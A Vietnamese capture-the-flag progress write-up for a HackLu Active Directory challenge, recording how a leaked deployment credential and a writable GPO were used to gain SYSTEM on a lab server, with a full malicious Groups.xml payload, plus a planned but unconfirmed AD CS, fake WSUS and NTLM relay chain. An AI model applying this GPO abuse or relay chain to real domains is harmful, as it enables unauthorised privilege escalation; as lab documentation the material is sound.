# HackLu AD-16 Technical Debt — tiến độ đã làm

## Trạng thái

Instance của bài đã hết hạn trước khi hoàn tất phần flag. Tài liệu này ghi lại những gì đã xác nhận, không coi phần WSUS/relay là đã thành công.

## Mô hình

```text
DC:  10.244.0.10
SRV: 10.244.0.20
```

Mục tiêu cuối theo đề là tìm thứ có giá trị trên Administrator Desktop của cả hai server.

## 1. Initial access

Trên SRV, share `REMINST` chứa `ImageUnattend.xml`. File này để lộ credential deploy:

```text
user: svc_deploy
pass: D3pl0y!_AgileCorp
domain: AGILE-CORP.HACKLU
```

Kiểm tra SMB:

```bash
smbclient.py 'AGILE-CORP/svc_deploy:D3pl0y!_AgileCorp@10.244.0.20'
```

Các share nhìn thấy gồm `ADMIN$`, `C$`, `IPC$`, `REMINST`. Ban đầu `C$` bị `STATUS_ACCESS_DENIED`, nên cần tìm cách nâng quyền qua GPO.

## 2. GPO writable

LDAP enumeration cho thấy GPO gắn với OU `Servers`:

```text
displayName: SRV-Baseline
GUID:        {D3196948-B05A-4CFC-A4AA-534417B76E06}
```

`svc_deploy` có quyền ghi vào GPO object và thư mục SYSVOL tương ứng. Vì vậy hướng đúng là sửa Group Policy Preferences để thêm `svc_deploy` vào local Administrators trên SRV.

Đường SYSVOL:

```text
\\agile-corp.hacklu\SYSVOL\agile-corp.hacklu\Policies\{D3196948-B05A-4CFC-A4AA-534417B76E06}\
```

File cần có:

```text
Machine\Preferences\Groups\Groups.xml
GPT.INI
```

XML quan trọng là:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}"
         name="Administrators" image="2"
         changed="2026-10-26 02:15:00"
         uid="{PUT-A-NEW-UUID-HERE}">
    <Properties action="U" newName="" description=""
                userAction="NONE"
                deleteAllUsers="0" deleteAllGroups="0"
                removeAccounts="0"
                groupName="Administrators"
                groupSid="S-1-5-32-544">
      <Members>
        <Member name="AGILE-CORP\svc_deploy"
                action="ADD"
                sid="S-1-5-21-2863576014-3922444201-2065203253-1103" />
      </Members>
    </Properties>
  </Group>
</Groups>
```

Điểm sửa quan trọng so với lần thử đầu:

- outer `Groups` CLSID phải là `{3125E937-EB16-4b4c-9934-544FC6D24D26}`;
- inner `Group` CLSID phải là `{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}`;
- `Properties` cần có `groupName="Administrators"`;
- không tự thêm CLSID vào `<Members>`;
- version của GPO phải được bump trong cả `GPT.INI` và thuộc tính LDAP `versionNumber`.

Ví dụ:

```ini
[General]
Version=8
displayName=New Group Policy Object
```

`gPCMachineExtensionNames` đã được đặt theo thứ tự CSE hợp lệ:

```text
[{00000000-0000-0000-0000-000000000000}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{17D89FEC-5C44-4972-B12D-241CAEF74509}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]
```

Sau khi policy refresh, `svc_deploy` có thể đọc `C$` và dùng SMB service execution để có SYSTEM trên SRV.

## 3. Clue trên SRV

Trên SYSTEM shell, Administrator Desktop có:

```text
RE- WSUS migration status.eml
```

Email nói WSUS đã chuyển sang HTTPS và trên DC có scheduled task:

```text
WSUS-FastScan
```

Task này chạy Windows Update scan định kỳ. Đây là lý do cần kiểm soát hostname WSUS và đón kết nối NTLM từ DC.

## 4. Hướng AD CS/WSUS đã chuẩn bị

Certipy enumeration cho thấy template `WebServer` có:

```text
Enrollee Supplies Subject: True
EKU: Server Authentication
```

Vì vậy hướng dự kiến là:

```text
SYSTEM trên SRV
  ↓ lấy SRV$ NT hash từ SAM/SYSTEM/SECURITY
xin certificate WebServer có SAN wsus.agile-corp.hacklu
  ↓
DNS poisoning wsus.agile-corp.hacklu → IP máy tấn công
  ↓
HTTPS fake WSUS
  ↓
NTLM relay tới LDAPS của DC
```

Các bước này mới chỉ được chuẩn bị trên instance; chưa có flag được xác nhận sau relay trước khi instance hết hạn.

## 5. Điều không nên ghi là “đã giải”

- Chưa xác nhận được flag của AD-16 Technical Debt.
- Ping tới SRV từng fail nhưng TCP 445 vẫn open; đó không phải bằng chứng đã lấy được flag.
- Việc tạo GPO và lấy SYSTEM trên SRV là đã làm được; phần AD CS + fake WSUS + relay là hướng tiếp theo, chưa chốt kết quả.
